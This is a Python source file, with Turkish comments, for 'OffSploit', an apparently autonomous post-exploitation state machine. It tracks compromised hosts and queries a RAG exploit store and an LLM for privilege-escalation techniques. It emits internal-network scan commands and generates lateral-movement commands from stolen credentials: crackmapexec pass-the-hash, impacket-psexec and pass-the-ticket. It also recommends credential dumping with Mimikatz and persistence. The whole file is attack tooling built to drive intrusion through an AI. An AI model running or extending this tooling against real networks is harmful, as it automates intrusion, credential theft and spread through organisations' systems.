#!/usr/bin/env python3
"""
OffSploit - Otonom Pivoting State Machine v1.0
================================================
Sızma sonrası yayılım için durum makinesi. İlk shell alındığında
pivot noktası kaydedilir, LPE için RAG sorguları atılır, iç ağ
keşfi sonuçları analiz edilir ve yeni saldırı zincirleri planlanır.
"""

import json
import logging
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path

import networkx as nx

logger = logging.getLogger("offsploit.statemachine")


# ─────────────────────────────────────────────
# Durum ve Model Tanımları
# ─────────────────────────────────────────────

class AttackState(Enum):
    """Saldırı durumu."""
    INITIAL = "initial"
    RECONNAISSANCE = "reconnaissance"
    SHELL_ACQUIRED = "shell_acquired"
    PRIVILEGE_ESCALATED = "privilege_escalated"
    PIVOTING = "pivoting"
    LATERAL_MOVEMENT = "lateral_movement"
    PERSISTENCE = "persistence"
    OBJECTIVE_REACHED = "objective_reached"


class AccessLevel(Enum):
    """Erişim seviyesi."""
    NONE = "none"
    USER = "user"
    ROOT = "root"
    SYSTEM = "system"
    DOMAIN_ADMIN = "domain_admin"


# Geçerli durum geçişleri
VALID_TRANSITIONS: dict[AttackState, list[AttackState]] = {
    AttackState.INITIAL: [AttackState.RECONNAISSANCE, AttackState.SHELL_ACQUIRED],
    AttackState.RECONNAISSANCE: [AttackState.SHELL_ACQUIRED],
    AttackState.SHELL_ACQUIRED: [AttackState.PRIVILEGE_ESCALATED, AttackState.PIVOTING, AttackState.LATERAL_MOVEMENT],
    AttackState.PRIVILEGE_ESCALATED: [AttackState.PIVOTING, AttackState.LATERAL_MOVEMENT, AttackState.PERSISTENCE, AttackState.OBJECTIVE_REACHED],
    AttackState.PIVOTING: [AttackState.LATERAL_MOVEMENT, AttackState.SHELL_ACQUIRED],
    AttackState.LATERAL_MOVEMENT: [AttackState.SHELL_ACQUIRED, AttackState.PRIVILEGE_ESCALATED, AttackState.OBJECTIVE_REACHED],
    AttackState.PERSISTENCE: [AttackState.PIVOTING, AttackState.LATERAL_MOVEMENT, AttackState.OBJECTIVE_REACHED],
    AttackState.OBJECTIVE_REACHED: [],
}


@dataclass
class PivotNode:
    """Ele geçirilen bir makine (pivot noktası).

    Attributes:
        ip: Makine IP adresi.
        hostname: Makine hostname'i.
        os: İşletim sistemi.
        arch: Mimari (x86/x64).
        access_level: Mevcut erişim seviyesi.
        shell_type: Shell türü (bash, cmd, powershell, meterpreter).
        timestamp: Ele geçirilme zamanı.
        credentials: Elde edilen kimlik bilgileri.
        open_ports: Tespit edilen açık portlar.
        notes: Ek notlar.
    """
    ip: str
    hostname: str = ""
    os: str = ""
    arch: str = "x64"
    access_level: AccessLevel = AccessLevel.USER
    shell_type: str = "bash"
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    credentials: list[dict] = field(default_factory=list)
    open_ports: list[int] = field(default_factory=list)
    notes: str = ""

    def to_dict(self) -> dict:
        return {
            "ip": self.ip,
            "hostname": self.hostname,
            "os": self.os,
            "arch": self.arch,
            "access_level": self.access_level.value,
            "shell_type": self.shell_type,
            "timestamp": self.timestamp,
            "credentials": self.credentials,
            "open_ports": self.open_ports,
            "notes": self.notes,
        }

    @classmethod
    def from_dict(cls, data: dict) -> "PivotNode":
        data = data.copy()
        data["access_level"] = AccessLevel(data.get("access_level", "user"))
        return cls(**data)


@dataclass
class StateTransition:
    """Durum geçişi kaydı."""
    from_state: AttackState
    to_state: AttackState
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    trigger: str = ""
    pivot_node: str | None = None  # IP adresi


# ─────────────────────────────────────────────
# Attack State Machine
# ─────────────────────────────────────────────

class AttackStateMachine:
    """Otonom pivoting ve post-exploitation durum makinesi.

    İş akışı:
        1. Shell alınır → SHELL_ACQUIRED durumuna geç
        2. Pivot noktası kaydedilir
        3. LPE için RAG sorgusu atılır
        4. İç ağ keşfi planlanır
        5. Yeni hedefler tespit edilir → LATERAL_MOVEMENT
        6. Hedef ele geçirilir → tekrar SHELL_ACQUIRED → döngü
    """

    def __init__(
        self,
        rag_engine=None,
        llm_client=None,
        on_event: Callable[[str, dict], None] | None = None,
        persist_path: str | None = None,
    ):
        self.state: AttackState = AttackState.INITIAL
        self.pivot_nodes: list[PivotNode] = []
        self.transitions: list[StateTransition] = []
        self.attack_graph: nx.DiGraph = nx.DiGraph()
        self.rag = rag_engine
        self.llm = llm_client
        self.on_event = on_event or (lambda e, d: None)
        self.persist_path = persist_path

        logger.info("[StateMachine] Otonom pivoting state machine başlatıldı.")

    # ── Durum Yönetimi ──

    def transition_to(self, new_state: AttackState, trigger: str = "", pivot_ip: str = "") -> bool:
        """Durumu geçiş yapar.

        Args:
            new_state: Hedef durum.
            trigger: Geçişi tetikleyen olay.
            pivot_ip: İlişkili pivot node IP'si.

        Returns:
            Geçiş başarılı mı.
        """
        valid_targets = VALID_TRANSITIONS.get(self.state, [])
        if new_state not in valid_targets:
            logger.warning(
                "[StateMachine] Geçersiz durum geçişi: %s → %s (izin: %s)",
                self.state.value, new_state.value, [s.value for s in valid_targets]
            )
            return False

        old_state = self.state
        self.state = new_state

        transition = StateTransition(
            from_state=old_state,
            to_state=new_state,
            trigger=trigger,
            pivot_node=pivot_ip,
        )
        self.transitions.append(transition)

        logger.info(
            "[StateMachine] Durum geçişi: %s → %s (tetik: %s)",
            old_state.value, new_state.value, trigger
        )

        self.on_event("state_transition", {
            "from": old_state.value,
            "to": new_state.value,
            "trigger": trigger,
            "pivot_ip": pivot_ip,
        })

        # Kalıcılık
        if self.persist_path:
            self._save_state()

        return True

    # ── Pivot Yönetimi ──

    def register_shell(self, pivot_node: PivotNode) -> bool:
        """Yeni shell kaydedip SHELL_ACQUIRED durumuna geçer.

        Args:
            pivot_node: Ele geçirilen makine bilgileri.

        Returns:
            Kayıt başarılı mı.
        """
        # Zaten kayıtlı mı kontrol et
        existing = [p for p in self.pivot_nodes if p.ip == pivot_node.ip]
        if existing:
            logger.info("[StateMachine] Mevcut pivot node güncelleniyor: %s", pivot_node.ip)
            idx = self.pivot_nodes.index(existing[0])
            self.pivot_nodes[idx] = pivot_node
        else:
            self.pivot_nodes.append(pivot_node)
            logger.info("[StateMachine] Yeni pivot node kaydedildi: %s (%s)", pivot_node.ip, pivot_node.os)

        # Saldırı grafiğine ekle
        self.attack_graph.add_node(
            pivot_node.ip,
            hostname=pivot_node.hostname,
            os=pivot_node.os,
            access_level=pivot_node.access_level.value,
        )

        # Durum geçişi
        if self.state in (AttackState.INITIAL, AttackState.RECONNAISSANCE, AttackState.PIVOTING, AttackState.LATERAL_MOVEMENT):
            self.transition_to(
                AttackState.SHELL_ACQUIRED,
                trigger=f"Shell acquired on {pivot_node.ip}",
                pivot_ip=pivot_node.ip,
            )

        self.on_event("shell_registered", pivot_node.to_dict())
        return True

    def get_pivot_nodes(self) -> list[PivotNode]:
        """Tüm pivot node'ları döndürür."""
        return self.pivot_nodes.copy()

    # ── LPE Planlama ──

    def plan_lpe(self, pivot_node: PivotNode) -> list[dict]:
        """Pivot node için Local Privilege Escalation önerileri üretir.

        Args:
            pivot_node: Yetki yükseltme yapılacak makine.

        Returns:
            LPE önerileri listesi.
        """
        logger.info("[StateMachine] LPE planlaması başlıyor: %s (%s)", pivot_node.ip, pivot_node.os)

        results: list[dict] = []

        # RAG'dan LPE exploit'lerini ara
        if self.rag:
            os_keyword = pivot_node.os.lower() if pivot_node.os else "linux"
            queries = [
                f"{os_keyword} local privilege escalation",
                f"{os_keyword} kernel exploit",
                f"{os_keyword} SUID GTFOBins",
            ]

            if "windows" in os_keyword:
                queries.extend([
                    "windows token impersonation",
                    "windows service exploit escalation",
                    "PrintSpoofer potato privilege escalation",
                ])

            for query in queries:
                try:
                    matches = self.rag.search(query, top_k=2)
                    for m in matches:
                        if m.distance < 0.7:
                            results.append({
                                "type": "rag_exploit",
                                "query": query,
                                "description": m.description,
                                "distance": m.distance,
                                "file_path": m.file_path,
                            })
                except Exception as exc:
                    logger.error("RAG LPE arama hatası: %s", exc)

        # LLM'den ek öneriler
        if self.llm:
            try:
                system_info = (
                    f"OS: {pivot_node.os}\n"
                    f"Mimari: {pivot_node.arch}\n"
                    f"Mevcut Erişim: {pivot_node.access_level.value}\n"
                    f"Shell: {pivot_node.shell_type}\n"
                )
                if pivot_node.notes:
                    system_info += f"Ek Bilgi: {pivot_node.notes}\n"

                llm_response = self.llm.ask_post_exploitation(
                    f"Hedef makine bilgileri:\n{system_info}\n\n"
                    "Bu makinede root/SYSTEM yetkisine yükselmek için kullanabileceğim "
                    "en etkili LPE tekniklerini ve komutlarını listele."
                )

                results.append({
                    "type": "llm_suggestion",
                    "content": llm_response,
                })
            except Exception as exc:
                logger.error("LLM LPE öneri hatası: %s", exc)

        logger.info("[StateMachine] LPE planlaması tamamlandı: %d öneri", len(results))
        return results

    # ── İç Ağ Keşfi ──

    def plan_internal_scan(self, pivot_node: PivotNode) -> dict:
        """Pivot node üzerinden iç ağ keşfi planlar.

        Args:
            pivot_node: Keşif yapılacak pivot makine.

        Returns:
            İç ağ keşif planı (komutlar + hedefler).
        """
        logger.info("[StateMachine] İç ağ keşfi planlanıyor: %s", pivot_node.ip)

        # IP subnet tespiti
        ip_parts = pivot_node.ip.split(".")
        subnet = f"{'.'.join(ip_parts[:3])}.0/24" if len(ip_parts) == 4 else "10.0.0.0/24"

        os_lower = (pivot_node.os or "linux").lower()
        is_windows = "windows" in os_lower

        plan = {
            "pivot_ip": pivot_node.ip,
            "target_subnet": subnet,
            "commands": [],
            "tools_needed": [],
        }

        if is_windows:
            plan["commands"] = [
                "# ARP tablosu — komşu cihazları bul",
                "arp -a",
                "",
                "# Port tarama (PowerShell)",
                f"1..254 | %{{Test-NetConnection -ComputerName '{'.'.join(ip_parts[:3])}.$_' -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue}}",
                "",
                "# Nmap (yüklü ise)",
                f"nmap -sP {subnet}",
                f"nmap -sV -sC -p 21,22,80,139,443,445,3389,5985 {subnet}",
                "",
                "# AD Enumeration",
                "net view /domain",
                "nltest /dclist:",
                "Get-ADComputer -Filter * | Select Name,DNSHostName",
            ]
            plan["tools_needed"] = ["nmap", "PowerShell", "net.exe"]
        else:
            plan["commands"] = [
                "# ARP tablosu — komşu cihazları bul",
                "arp -a",
                "ip neigh show",
                "",
                "# Hızlı ping sweep",
                f"for i in $(seq 1 254); do ping -c 1 -W 1 {'.'.join(ip_parts[:3])}.$i &>/dev/null && echo '{'.'.join(ip_parts[:3])}.$i UP'; done",
                "",
                "# Nmap (yüklü ise veya transfer et)",
                f"nmap -sn {subnet}",
                f"nmap -sV -sC -p 21,22,80,139,443,445,3306,5432,8080 {subnet}",
                "",
                "# Netstat — aktif bağlantılar",
                "netstat -tulpn",
                "ss -tulpn",
            ]
            plan["tools_needed"] = ["nmap", "bash", "ping"]

        # Durum geçişi
        self.transition_to(
            AttackState.PIVOTING,
            trigger=f"Internal scan planned from {pivot_node.ip}",
            pivot_ip=pivot_node.ip,
        )

        logger.info("[StateMachine] İç ağ keşif planı hazır: %s", subnet)
        return plan

    # ── Yanal Hareket ──

    def plan_lateral_movement(self, from_node: PivotNode, target_ip: str) -> dict:
        """Pivot noktasından hedef sisteme yanal hareket planlar.

        Args:
            from_node: Kaynak pivot makine.
            target_ip: Hedef IP adresi.

        Returns:
            Yanal hareket planı.
        """
        logger.info("[StateMachine] Yanal hareket planlanıyor: %s → %s", from_node.ip, target_ip)

        plan = {
            "from_ip": from_node.ip,
            "target_ip": target_ip,
            "techniques": [],
            "llm_plan": "",
        }

        # Credential varsa, bunları kullan
        if from_node.credentials:
            for cred in from_node.credentials:
                username = cred.get("username", "")
                cred_type = cred.get("type", "password")

                if cred_type == "ntlm_hash":
                    plan["techniques"].append({
                        "name": "Pass-The-Hash",
                        "command": f"crackmapexec smb {target_ip} -u '{username}' -H '{cred.get('hash', '')}' --exec-method smbexec",
                    })
                elif cred_type == "password":
                    plan["techniques"].append({
                        "name": "PSExec",
                        "command": f"impacket-psexec '{username}:{cred.get('password', '')}@{target_ip}'",
                    })
                elif cred_type == "kerberos_ticket":
                    plan["techniques"].append({
                        "name": "Pass-The-Ticket",
                        "command": f"export KRB5CCNAME={cred.get('ticket_path', '')}\nimpacket-psexec -k -no-pass {target_ip}",
                    })

        # LLM'den ek öneriler
        if self.llm:
            try:
                context = (
                    f"Kaynak: {from_node.ip} (OS: {from_node.os}, "
                    f"Erişim: {from_node.access_level.value}, Shell: {from_node.shell_type})\n"
                    f"Hedef: {target_ip}\n"
                    f"Mevcut Credential'lar: {len(from_node.credentials)}\n"
                )
                plan["llm_plan"] = self.llm.ask_post_exploitation(
                    f"Aşağıdaki pivot noktasından hedef sisteme yanal hareket planla:\n{context}"
                )
            except Exception as exc:
                logger.error("LLM yanal hareket planı hatası: %s", exc)

        # Saldırı grafiğine kenar ekle
        self.attack_graph.add_edge(from_node.ip, target_ip, relation="lateral_movement")

        # Durum geçişi
        self.transition_to(
            AttackState.LATERAL_MOVEMENT,
            trigger=f"Lateral movement to {target_ip}",
            pivot_ip=from_node.ip,
        )

        return plan

    # ── Saldırı Grafiği ──

    def get_attack_graph(self) -> dict:
        """Saldırı grafiğini JSON serileştirilebilir formatta döndürür."""
        nodes = []
        for node_id in self.attack_graph.nodes():
            node_data = self.attack_graph.nodes[node_id]
            # Pivot node detaylarını ekle
            pivot = next((p for p in self.pivot_nodes if p.ip == node_id), None)
            nodes.append({
                "id": node_id,
                "hostname": node_data.get("hostname", ""),
                "os": node_data.get("os", ""),
                "access_level": node_data.get("access_level", "unknown"),
                "is_compromised": pivot is not None,
            })

        edges = []
        for src, tgt, data in self.attack_graph.edges(data=True):
            edges.append({
                "source": src,
                "target": tgt,
                "relation": data.get("relation", ""),
            })

        return {
            "nodes": nodes,
            "edges": edges,
            "current_state": self.state.value,
            "total_pivots": len(self.pivot_nodes),
        }

    # ── Durum Özeti ──

    def get_status(self) -> dict:
        """State machine'in mevcut durumunu özetler."""
        return {
            "state": self.state.value,
            "pivot_count": len(self.pivot_nodes),
            "transition_count": len(self.transitions),
            "pivots": [p.to_dict() for p in self.pivot_nodes],
            "transitions": [
                {
                    "from": t.from_state.value,
                    "to": t.to_state.value,
                    "trigger": t.trigger,
                    "timestamp": t.timestamp,
                }
                for t in self.transitions
            ],
            "attack_graph": self.get_attack_graph(),
        }

    # ── Sonraki Adım Planlaması ──

    def plan_next_move(self) -> dict:
        """Mevcut duruma göre otomatik olarak sonraki adımı planlar.

        Returns:
            Sonraki adım planı.
        """
        plan = {
            "current_state": self.state.value,
            "recommended_actions": [],
            "details": {},
        }

        if self.state == AttackState.INITIAL:
            plan["recommended_actions"] = ["Nmap taraması başlat", "BloodHound verisi yükle"]

        elif self.state == AttackState.SHELL_ACQUIRED:
            latest_pivot = self.pivot_nodes[-1] if self.pivot_nodes else None
            if latest_pivot:
                if latest_pivot.access_level in (AccessLevel.USER, AccessLevel.NONE):
                    plan["recommended_actions"] = ["LPE çalıştır (plan_lpe)"]
                    plan["details"] = {"lpe_targets": [latest_pivot.ip]}
                else:
                    plan["recommended_actions"] = [
                        "İç ağ keşfi yap (plan_internal_scan)",
                        "Credential dump yap",
                        "Kalıcılık (persistence) kur",
                    ]

        elif self.state == AttackState.PRIVILEGE_ESCALATED:
            plan["recommended_actions"] = [
                "Credential dump (Mimikatz/hashdump)",
                "İç ağ keşfi yap",
                "Yanal hareket planla",
            ]

        elif self.state == AttackState.PIVOTING:
            plan["recommended_actions"] = [
                "Keşif sonuçlarını analiz et",
                "Yeni hedef seç",
                "Yanal hareket planla (plan_lateral_movement)",
            ]

        elif self.state == AttackState.LATERAL_MOVEMENT:
            plan["recommended_actions"] = [
                "Yeni shell kaydı yap (register_shell)",
                "Başka hedeflere yönel",
            ]

        return plan

    # ── Kalıcılık (Serialize/Deserialize) ──

    def to_dict(self) -> dict:
        """State machine'i JSON serileştirilebilir sözlüğe dönüştürür."""
        return {
            "state": self.state.value,
            "pivot_nodes": [p.to_dict() for p in self.pivot_nodes],
            "transitions": [
                {
                    "from_state": t.from_state.value,
                    "to_state": t.to_state.value,
                    "timestamp": t.timestamp,
                    "trigger": t.trigger,
                    "pivot_node": t.pivot_node,
                }
                for t in self.transitions
            ],
        }

    @classmethod
    def from_dict(cls, data: dict, **kwargs) -> "AttackStateMachine":
        """JSON sözlüğünden state machine oluşturur."""
        sm = cls(**kwargs)
        sm.state = AttackState(data.get("state", "initial"))

        for pn_data in data.get("pivot_nodes", []):
            pn = PivotNode.from_dict(pn_data)
            sm.pivot_nodes.append(pn)
            sm.attack_graph.add_node(pn.ip, hostname=pn.hostname, os=pn.os, access_level=pn.access_level.value)

        for t_data in data.get("transitions", []):
            sm.transitions.append(StateTransition(
                from_state=AttackState(t_data["from_state"]),
                to_state=AttackState(t_data["to_state"]),
                timestamp=t_data.get("timestamp", ""),
                trigger=t_data.get("trigger", ""),
                pivot_node=t_data.get("pivot_node"),
            ))

        return sm

    def _save_state(self) -> None:
        """Durumu diske yazar."""
        if not self.persist_path:
            return
        try:
            path = Path(self.persist_path)
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(
                json.dumps(self.to_dict(), indent=2, ensure_ascii=False),
                encoding="utf-8"
            )
            logger.debug("[StateMachine] Durum kaydedildi: %s", path)
        except Exception as exc:
            logger.error("[StateMachine] Durum kaydedilemedi: %s", exc)

    def load_state(self) -> bool:
        """Durumu diskten yükler."""
        if not self.persist_path:
            return False
        try:
            path = Path(self.persist_path)
            if not path.exists():
                return False
            data = json.loads(path.read_text(encoding="utf-8"))
            loaded = AttackStateMachine.from_dict(data, rag_engine=self.rag, llm_client=self.llm, on_event=self.on_event)
            self.state = loaded.state
            self.pivot_nodes = loaded.pivot_nodes
            self.transitions = loaded.transitions
            self.attack_graph = loaded.attack_graph
            logger.info("[StateMachine] Durum yüklendi: state=%s, %d pivot", self.state.value, len(self.pivot_nodes))
            return True
        except Exception as exc:
            logger.error("[StateMachine] Durum yüklenemedi: %s", exc)
            return False
